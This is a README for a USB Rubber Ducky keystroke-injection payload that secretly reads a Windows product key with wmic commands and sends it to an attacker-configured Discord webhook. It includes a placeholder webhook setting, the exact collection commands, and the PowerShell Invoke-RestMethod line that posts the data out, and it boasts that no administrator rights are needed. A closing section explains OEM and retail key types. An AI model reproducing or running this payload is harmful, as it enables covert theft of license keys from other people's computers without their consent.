# Exfiltrate Windows Product Key

Through this payload, you can export the key information related to the Windows Product Key, knowing its type and the key itself, using a Discord Webhook.

No administrator permissions are required to do this, isn't that absurd, right? :-)

![](https://i.ibb.co/m4QpT5v/1.png)

**Category**: Exfiltration

## Index

- [Introduction](#exfiltrate-windows-product-key)
- [Note](#note)
- [Dependencies](#dependencies)
- [Settings](#settings)
- [Payload Description](#payload-description)
- [Product Key Types](#product-key-types)
- [Sources](#sources)

## Note

Tested on:
- Windows 11

## Dependencies

- Discord Webhook

## Settings

- `QUACK REM VARIABLES:`: Introduces a section for variables in the code.
- `QUACK REM Put here your Discord Webhook`: Indicates where the user should put their Discord webhook URL.

This code snippet is useful for setting up a Discord webhook integration by defining the necessary variable to hold the webhook URL.

```plaintext
QUACK REM VARIABLES:
QUACK REM Put here your Discord Webhook
DISCORD-WEBHOOK="https://discord.com/api/webhooks/0123456789.../abcefg..."
```


## Payload Description

Through this payload, you can export essential information related to the Windows Product Key using a Discord Webhook, ensuring that you identify its type and the key itself.

The following commands are executed to obtain the necessary information about the Product Key:

1. This command retrieves the currently in-use Product Key:

   ```powershell
   wmic path softwarelicensingservice get OA3xOriginalProductKey
   ```

2. This command helps determine the type of key. You can refer to the [key types section](#key-types) for more details:

   ```powershell
   wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription
   ```

The acquired information is stored in the `$exfiltration` variable, which is subsequently used to create the `$payload` object. This object is then utilized for exfiltration via a Discord Webhook.

**Exfiltration**:

```powershell
Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'; exit
```

The `$hookUrl` variable was initialized at the beginning of the payload with the value you need to define before execution.

## Product Key Types

When dealing with Windows Product Keys, it's essential to understand the different types and their characteristics:

- **OEM Keys** (*Original Equipment Manufacturer*):

      **Transferability**: Not supposed to be transferable. These keys are typically tied to the prebuilt PC on which they were originally installed.
      **Usage**: Manufacturers use OEM keys to install Windows on new computers.
      **Procurement**: OEM keys can sometimes be found at discount key vendors, although their use on different hardware may be challenging.

- **Retail Keys** (*aka "Full Packaged Product" Keys*):
      
      **Transferability**: Transferrable. These keys can be moved from one computer to another.
      **Cost**: Retail keys are often more expensive, often exceeding $100.
      **Hidden Keys**: In some cases, a computer may already have a retail key, perhaps from a previous Windows upgrade. Users might not be aware of this until they check.

Understanding these key types is crucial when working with Windows Product Keys, as it can impact their use, transferability, and compatibility with different hardware and scenarios.

*Note: Source of this info [[2](#sources)]*

## Sources

- [1] Detect Ready: https://shop.hak5.org/blogs/usb-rubber-ducky/detect-ready
- [2] Is your Windows Product Key transferrable? https://www.tomshardware.com/how-to/transfer-windows-license-to-new-pc#is-your-windows-product-key-transferrable-3